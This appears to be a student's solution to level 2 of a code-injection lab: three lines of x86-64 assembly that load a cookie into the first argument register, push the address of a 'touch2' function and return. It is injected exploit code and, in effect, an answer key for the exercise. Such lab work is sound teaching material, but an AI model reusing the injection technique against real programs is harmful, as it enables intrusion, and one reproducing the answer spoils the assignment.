# exploit code for level 2

        movq    $0x2db19fd3,%rdi     # move cookie to first argument
        pushq   $0x4012ac            # touch2 address onto stack
        retq

